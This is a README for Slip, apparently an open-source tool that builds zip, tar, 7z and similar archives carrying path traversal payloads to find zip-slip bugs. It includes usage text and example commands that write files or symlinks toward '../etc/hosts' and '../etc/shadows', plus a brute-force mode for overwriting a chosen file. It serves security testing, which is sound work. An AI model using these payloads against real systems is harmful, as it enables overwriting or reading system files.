# Slip

Slip is a malicious archive generator to exploit path traversal vulnerabilities.

Slip makes it easy to create multiple archives containing path traversal payloads in file name fields, rendering the extraction of the archive a potentially dangerous operation. With this approach it is possible to find and exploit "[zip-slip](https://security.snyk.io/research/zip-slip-vulnerability)" type vulnerabilities.

## Motivation

Most commonly used tools rarely support path traversal payloads in archives, this makes it hard and time consuming to create malicious archives when attempting to find vilnerabilities in a software. With slip it's really convenient to create higly customizable archives that fit most situations.

## Features

Slip is a feature rich script capable of satisfying most "zip-slip" hunting needs, in particular the script:

- Supports **zip**, **tar**, **7z**, **jar**, **war**, **apk** and **ipa** archives (and every compression algorithm supported by each format)
- Allows to hunt for both **arbitrary file write** and **arbitrary file read** vulnerabilities (using paths or symlinks)
- Supports multiple payloads of different types (paths/symlinks)
- Supports the automatic generation of path traversal payloads to look for a file at different "depths" 
- Supports the usage of custom "dotdotslash" sequences
- Implements a "massfind" mode, that uses a payload dictionary to create the archive

## Getting started

### Installation
Clone the repo, install the requirements (`pip install -r requirements.txt`) and you're good to go!

### Usage
```
Usage: slip.py [OPTIONS] ARCHIVE_NAME

  Script to generate "zipslip" and "zip symlink" archives.

  ARCHIVE-NAME is the name of the archive to be created.

Options:
  -a, --archive-type [zip|tar|7z|jar|war|apk|ipa]
                                  Type of the archive.  [default: zip]
  -c, --compression [none|deflate|bzip2|lzma|lzma2|ppmd|brotli|zstandard|copy]
                                  Compression algorithm to use in the archive.
  -p, --paths TEXT                Comma separated paths to include in the
                                  archive.
  -s, --symlinks TEXT             Comma separated symlinks to include in the
                                  archive. To name a symlink use the syntax:
                                  path;name
  --file-content TEXT             Content of the files in the archive,
                                  mandatory if paths are used.
  --force-name                    If set, the filename will be forced exactly
                                  as provided.
  --search INTEGER                If set, paths and symlink will generate
                                  multiple traversal paths to try and find the
                                  target file or path at different depths.
                                  [default: 0]
  --dotdotslash TEXT              Dot dot slash sequence to use in search
                                  mode.  [default: ../]
  --mass-find TEXT                Name of the file to find. It will create an
                                  archive with numerous path traversal
                                  payloads aimed to find the specified file
                                  name. WARNING: it uses A LOT of payloads,
                                  use with caution.
  --mass-find-mode [paths|symlinks]
                                  Mass-find mode to use  [default: symlinks]
  --mass-find-dict FILENAME       Mass-find payload dictionary  [default:
                                  path_traversal_dict.txt]
  --mass-find-placeholder TEXT    Mass-find placeholder for filename in
                                  dictionary  [default: {FILE}]
  -v, --verbose                   Verbosity trigger.
  --help                          Show this message and exit.
```

### Usage example

Create a tar.bz2 archive containing 2 explicit paths: 
```
python3 slip.py --archive-type tar --compression bzip2 --paths "../etc/hosts, ../../etc/hosts" --file-content "foo" archive
```

Create a zip archive containing an explicit path and an explicit symlink: 
```
python3 slip.py --archive-type zip --compression deflate --paths "../etc/hosts" --symlinks "../etc/shadows" --file-content "foo" archive
```

Create a tar.bz2 archive with 4 payloads to search for "config.ini" at 3 different depths (it also uses Windows flavor dot dot slash): 
```
python3 slip.py --archive-type tar --compression bzip2 --paths "config.ini" --search 3 --dotdotslash "..\\" --file-content "foo" archive
```
The archive will contain:
```
config.ini
..\config.ini
..\..\config.ini
..\..\..\config.ini
```

Create a 7z archive with a named symlink:
```
python3 slip.py --archive-type zip --symlinks "../etc/hosts;linkname" archive  
```
This technique is really useful in case directory traversal payloads are filtered in paths but not in symlink, as it would be possible to achieve an arbitrary write file referring to the named symlink as parth of the path (e.g. symlink: `../etc/;foo`, path: `foo/hosts`).

Create a tar archive with multiple payloads (from the default mass-find dictionary) to find the `/etc/host/` file:
```
python3 slip.py --archive-type tar --mass-find "/etc/hosts" --mass-find-mode symlinks archive
```
⚠️ WARNING: mass-find mode supports paths, this translates to a bruteforce attempt to rewrite a specific file, but it potentially uses A LOT of payloads, so the result is unpredictable. Use with caution.

## Notes
- Depending on the library that handles the decompression, results may vary greatly.

  Different compression algorithms can trigger different behaviours during the extraction, but also the usage of certain path traversal payloads in names or the co-presence of path traversal payloads in names and symlink can lead to weird behaviours during the extraction. Many combinations of compression algorithms, archive types and payloads are relatively untested and should be evaluated on a case by case basis to obtain the best results.

- Archive types: jar|war|apk|ipa are supported as simple zip archives.  
The archive format is correct, but valid archives should contain compatible contents.
Valid contents can be set manually and are not yet supported by slip.
Please note that many software that handles these formats, treat them as zip files.
This means that using the correct extension will suffice.

## License
This project is licensed under the GPL-3.0 [License](https://github.com/0xless/slip/blob/main/LICENSE).
